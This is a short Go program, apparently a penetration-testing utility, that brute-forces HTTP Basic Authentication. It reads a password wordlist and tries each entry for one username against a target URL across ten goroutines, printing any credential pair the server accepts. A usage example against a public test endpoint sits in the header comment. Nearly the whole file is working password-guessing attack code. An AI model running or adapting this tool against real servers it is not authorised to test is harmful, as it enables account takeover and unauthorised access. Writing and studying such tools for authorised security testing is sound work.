/*
Copyright (c) 2013, AverageSecurityGuy
# All rights reserved.

Simple Go script to test a username and password list against an HTTP Basic
Auth server. Example usage and output:

$ ./brute_http_basic https://httpbin.org/basic-auth/test/test test words.txt
https://httpbin.org/basic-auth/test/test - test:test
*/

package main

import (
    "os"
    "fmt"
    "log"
    "sync"
    "net/http"
    "bufio"
    "strings"
)


func basicAuth(url, username, password string) {
    /*
    Send an HTTP Basic Auth request with the given username and password.
    */
    client := &http.Client{}

    req, err := http.NewRequest("GET", url, nil)
    req.SetBasicAuth(username, password)

    resp, err := client.Do(req)

    if err != nil {
        fmt.Println(err)
    } else if resp.StatusCode == 401 {

    } else {
        fmt.Printf("%s - %s:%s\n", url, username, password)
    }
}


func main() {
    if len(os.Args) != 4 {
        fmt.Println("Usage: brute_http_basic url username pass_file")
        os.Exit(1)
    }

    url := os.Args[1]
    username := os.Args[2]
    pass_file := os.Args[3]
    threads := 10

    // Open our password lists.
    pwds, err := os.Open(pass_file)
    if err != nil {
        log.Fatal("Failed to open password file.")
    }

    // channels used for comms
    passChan := make(chan string, threads)

    // Use a wait group for waiting for all threads to finish
    processorGroup := new(sync.WaitGroup)
    processorGroup.Add(threads)

    // Create goroutines for each of the number of threads
    // specified.
    for i := 0; i < threads; i++ {
        go func() {
            for {
                pass := <-passChan

                // Did we reach the end? If so break.
                if pass == "" {
                    break
                }

                // Mode-specific processing
                basicAuth(url, username, pass)
            }

            // Indicate to the wait group that the thread
            // has finished.
            processorGroup.Done()
        }()
    }

    defer pwds.Close()

    // Lazy reading of the password file line by line
    pscan := bufio.NewScanner(pwds)
    for pscan.Scan() {
        pass := pscan.Text()

        if strings.HasPrefix(pass, "#") == false {
            passChan <- pass
        }
    }

    close(passChan)
    processorGroup.Wait()
}
